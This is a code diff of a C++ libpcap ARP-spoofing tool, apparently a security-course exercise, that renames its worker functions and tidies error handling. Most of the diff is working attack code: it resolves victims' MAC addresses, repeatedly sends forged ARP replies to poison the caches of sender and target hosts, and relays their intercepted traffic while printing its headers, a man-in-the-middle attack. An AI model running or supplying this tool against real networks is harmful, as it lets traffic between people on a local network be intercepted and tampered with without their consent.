@@ -57,7 +57,7 @@ typedef struct eIpv4Hdr_{
 	uint32_t DST_IP_ADDR;
 }eIpv4Hdr;
 
-// Eth && Ipv4 && Tcp packet structure.
+// Eth && Ipv4 packet structure.
 struct eEthIpv4TcpPacket{
 	eEthHdr eEthHdr_;
 	eIpv4Hdr eIpv4Hdr_;
@@ -69,17 +69,17 @@ void usage();
 Mac GetMyMac(const std::string deviceName_);
 Ip GetMyIp(std::string deviceName_);
 
-void ResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
+void tResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> IpList_, std::vector<Mac>& MacList_);
 
-void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
+void tResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> IpList_, std::vector<Mac>& MacList_);
 
-void SpoofWorker(const char* deviceName_, Mac MyMac_,
+void tInfectAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
 std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_, int period_);
 
-void RelayWorker(const char* deviceName_, Mac MyMac_,
+void tRelayAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_);
 
@@ -90,18 +90,12 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	char* dev = argv[1];
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
+	const char* dev = argv[1];
 
 	// get my mac address.
 	Mac MyMac(GetMyMac(argv[1]));
 	if (MyMac.isNull()){
-		fprintf(stderr, "couldn't get my mac address\n");
+		fprintf(stderr, "main: GetMyMac error\n");
 		return -1;
 	}
 
@@ -121,21 +115,27 @@ int main(int argc, char* argv[]) {
 		}
 	}
 
-	std::thread ResolveMacThread1(ResolveTargetMacSender, dev, MyMac, senderIpList, std::ref(senderMacList));
-	std::thread ResolveMacThread2(ResolveTargetMacReceiver, dev, MyMac, senderIpList, std::ref(senderMacList));
-	ResolveMacThread1.join();
-	ResolveMacThread2.join();
+	// resolve sender's MAC address.
+	std::thread ResolveTargetMacThread1(tResolveTargetMacSender, dev, MyMac, senderIpList, std::ref(senderMacList));
+	std::thread ResolveTargetMacThread2(tResolveTargetMacReceiver, dev, MyMac, senderIpList, std::ref(senderMacList));
+	ResolveTargetMacThread1.join();
+	ResolveTargetMacThread2.join();
 
-	std::thread ResolveMacThread3(ResolveTargetMacSender, dev, MyMac, targetIpList, std::ref(targetMacList));
-	std::thread ResolveMacThread4(ResolveTargetMacReceiver, dev, MyMac, targetIpList, std::ref(targetMacList));
-	ResolveMacThread3.join();
-	ResolveMacThread4.join();
+	// resolve target's MAC address.
+	std::thread ResolveSenderMacThread1(tResolveTargetMacSender, dev, MyMac, targetIpList, std::ref(targetMacList));
+	std::thread ResolveSenderMacThread2(tResolveTargetMacReceiver, dev, MyMac, targetIpList, std::ref(targetMacList));
+	ResolveSenderMacThread1.join();
+	ResolveSenderMacThread2.join();
 
-	std::thread SpoofThread(SpoofWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 10000);
-	std::thread RealyThread(RelayWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
-	RealyThread.join();
-	SpoofThread.join();
-	pcap_close(handle);
+	// infect all.
+	std::thread InfectThread(tInfectAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 10000);
+
+	// relay all.
+	std::thread RelayThread(tRelayAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
+
+	RelayThread.join();
+	InfectThread.join();
+	return 0;
 }
 
 
@@ -163,16 +163,15 @@ Mac GetMyMac(const std::string deviceName_){
 	std::ifstream ifr;
 	ifr.open(filePath, std::ifstream::in);
 	if (!ifr.is_open()){
-		fprintf(stderr, "can't open file %s\n", filePath.c_str());
+		fprintf(stderr, "GetMyMac error=cannot open %s\n", filePath.c_str());
 		return Mac().nullMac();
 	}
 
 	static std::string res;
 	std::getline(ifr, res);
 	ifr.close();
-	Mac myMacAddr(res);
 	
-	return myMacAddr;
+	return Mac(res);
 }
 
 
@@ -204,21 +203,23 @@ Ip GetMyIp(std::string deviceName_){
  * @param[in] IpList_ target Ip object list.
  * @param[out] MacList_ target Mac object list to fill.
  */
-void ResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
+void tResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
+		fprintf(stderr, "pcap_open_live error=%s(%s)\n", deviceName_, errbuf);
 		return;
 	}
 
+	int res = 0;
 	int cnt = 0;
 	while (true)
 	{
 		usleep(1000);
 g_mutex_resolveMac.lock();
 		if(IpList_.size() == MacList_.size()){
+			// check thread end timing.
 			break;
 		}
 g_mutex_resolveMac.unlock();
@@ -233,13 +234,14 @@ g_mutex_resolveMac.unlock();
 		pktArpReq.arp_.pln_ = Ip::SIZE;
 		pktArpReq.arp_.op_ = htons(ArpHdr::Request);
 		pktArpReq.arp_.smac_ = MyMac_;
-		pktArpReq.arp_.sip_ = htonl(GetMyIp(deviceName_));	// I can use custom ip.
+		pktArpReq.arp_.sip_ = htonl(GetMyIp(deviceName_)); // I can use any IP address execpt "0.0.0.0" or target IP address.
 		pktArpReq.arp_.tmac_ = Mac().nullMac();
 		pktArpReq.arp_.tip_ = htonl(IpList_.at(cnt++ % IpList_.size()));
 
-		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpReq), sizeof(EthArpPacket));
+		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpReq), sizeof(EthArpPacket));
 		if (res != 0) {
-			fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+			pcap_close(handle);
 			return;
 		}
 	}
@@ -258,12 +260,12 @@ g_mutex_resolveMac.unlock();
  * @param[in] IpList_ target Ip object list.
  * @param[out] MacList_ target Mac object list to fill.
  */
-void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
+void tResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
+		fprintf(stderr, "pcap_open_live error=%s(%s)\n", deviceName_, errbuf);
 		return;
 	}
 	
@@ -272,9 +274,10 @@ void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
 	struct pcap_pkthdr* header;
 	while (true)
 	{
-		usleep(0);
+		usleep(1000);
 g_mutex_resolveMac.lock();
 		if(IpList_.size() == MacList_.size()){
+			// check thread end timing.
 			break;
 		}
 g_mutex_resolveMac.unlock();
@@ -284,6 +287,7 @@ g_mutex_resolveMac.unlock();
 		res = pcap_next_ex(handle, &header, &rawArpRep);
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			pcap_close(handle);
 			return;
 		}
 
@@ -332,21 +336,21 @@ g_mutex_resolveMac.unlock();
  * @param TargetMacList_ target Mac object list to infect.
  * @param period_ infection period value to put to usleep().
  */
-void SpoofWorker(const char* deviceName_, Mac MyMac_,
+void tInfectAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_,
  int period_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "@SpoofWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
+		fprintf(stderr, "pcap_open_live error=%s\n", pcap_geterr(handle));
 		return;
 	}
 	
 	if (!(SenderIpList_.size() == SenderMacList_.size()
 	 && SenderMacList_.size() == TargetIpList_.size()
 	 && TargetIpList_.size() == TargetMacList_.size())){
-		fprintf(stderr, "@SpoofWorker: lise size error\n");
+		fprintf(stderr, "@tInfectAll: lise size error\n");
 		return;
 	}
 	const size_t listSize = SenderIpList_.size();
@@ -401,7 +405,7 @@ g_mutex_resolveMac.lock();
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepInfectSenderList.at(i))), sizeof(EthArpPacket));
 g_mutex_resolveMac.unlock();
 			if (res != 0) {
-				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
 				return;
 			}
 			//printf("%s -> %s\n", std::string(pktArpRepInfectSenderList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectSenderList.at(i).eth_.dmac()).c_str());
@@ -410,7 +414,7 @@ g_mutex_resolveMac.lock();
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfectTargetList.at(i)), sizeof(EthArpPacket));
 g_mutex_resolveMac.unlock();
 			if (res != 0) {
-				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
 				return;
 			}
 			//printf("%s -> %s\n", std::string(pktArpRepInfectTargetList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectTargetList.at(i).eth_.dmac()).c_str());
@@ -430,20 +434,20 @@ g_mutex_resolveMac.unlock();
  * @param TargetIpList_ target Ip object list to relay.
  * @param TargetMacList_ target Mac object list to relay.
  */
-void RelayWorker(const char* deviceName_, Mac MyMac_,
+void tRelayAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "@RelayWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
+		fprintf(stderr, "pcap_open_live error=%s\n", pcap_geterr(handle));
 		return;
 	}
 	
 	if (!(SenderIpList_.size() == SenderMacList_.size()
 	 && SenderMacList_.size() == TargetIpList_.size()
 	 && TargetIpList_.size() == TargetMacList_.size())){
-		fprintf(stderr, "@RelayWorker: list size error\n");
+		fprintf(stderr, "@tRelayAll: list size error\n");
 		return;
 	}
 	const size_t listSize = SenderIpList_.size();
@@ -459,7 +463,7 @@ void RelayWorker(const char* deviceName_, Mac MyMac_,
 		const u_char* rawRecv;
 		res = pcap_next_ex(handle, &header, &rawRecv);
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("@RelayWorker: pcap_next_ex error=%s\n", pcap_geterr(handle));
+			printf("@tRelayAll: pcap_next_ex error=%s\n", pcap_geterr(handle));
 			return;
 		}
 
@@ -478,7 +482,7 @@ void RelayWorker(const char* deviceName_, Mac MyMac_,
 	
 			// src ip가 sender이고, 내 ip로 보낸 것이 아니라면,
 			if (pktSrcIp == senderIp && pktDstIp != myIpAddr) {
-				printf("@RelayWorker: sender -> target\n");
+				printf("@tRelayAll: sender -> target\n");
 				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n",
 				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
 				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
@@ -495,7 +499,7 @@ g_mutex_resolveMac.lock();
 				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
 g_mutex_resolveMac.unlock();
 				if (res != 0) {
-					fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
 					return;
 				}
 				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n\n\n",
@@ -511,7 +515,7 @@ g_mutex_resolveMac.unlock();
 			if (memcmp(pktHdr->eEthHdr_.SRC_MAC_ADDR, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6) == 0
 			&& pktDstIp == senderIp){
 				// Sender하게 보낸 패킷만 변조해야 함.
-				printf("@RelayWorker: target -> sender\n");
+				printf("@tRelayAll: target -> sender\n");
 				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n",
 				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
 				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
@@ -526,7 +530,7 @@ g_mutex_resolveMac.lock();
 				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
 g_mutex_resolveMac.unlock();
 				if (res != 0) {
-					fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
 					return;
 				}
 				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n\n\n",
